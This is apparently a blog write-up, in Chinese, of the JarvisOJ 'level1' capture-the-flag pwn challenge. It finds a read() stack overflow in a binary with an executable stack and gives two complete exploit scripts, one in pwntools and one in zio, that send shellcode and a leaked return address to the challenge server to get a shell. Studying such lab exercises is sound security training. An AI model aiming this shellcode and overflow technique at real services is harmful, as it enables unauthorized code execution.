---
layout:     post
title:      jarvisoj [XMAN]level1
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/level1.80eacdcd51aca92af7749d96efad7fb5  
>  
>Address:  
>nc pwn2.jarvisoj.com 9877  
<!-- more -->


### 0x00 查看文件基本信息

```
file level1
checksec level1
```

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level1/0x00.png)

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level1/0x01.png)


### 0x01 在kali linux 2.0中执行程序
```
chmod a+x ./level1
./level1
```

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level1/0x02.png)


### 0x02 IDA中分析可执行文件

直接看C代码，很明显vulnerable_function就是溢出函数了

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level1/0x03.png)

跟进去果然read溢出

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level1/0x04.png)

看一下缓冲区，因为没有禁止栈执行，我们可以在栈区放置一段shellcode

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level1/0x05.png)


### 0x03 根据以上分析写成exploit

调用pwntools

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *
import re
distance = 0x88 + 4
shellcode = '\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34'
junk = "A" * (distance - len(shellcode))
# Io = process('.\level1')
Io = remote('pwn2.jarvisoj.com', 9877)
line = Io.readline()
line = re.findall(r":(.+)\?", line)
address = p32(int(line[0],16))
payload = shellcode + junk + address
Io.send(payload)
Io.interactive()
```

调用zio
```
#!/usr/bin/python
# -*- coding:utf8 -*-

import zio
distance = 0x88 + 4
shellcode = '\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34'
junk = "A" * (distance - len(shellcode))
# Io = zio.zio("./level1")
Io = zio.zio(("pwn2.jarvisoj.com", 9877))
line = Io.readline()
address = zio.l32(int(line[len("What's this:"):-2], 16))
payload = shellcode + junk + address
Io.write(payload)
Io.interact()
```

得到flag

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level1/0x06.png)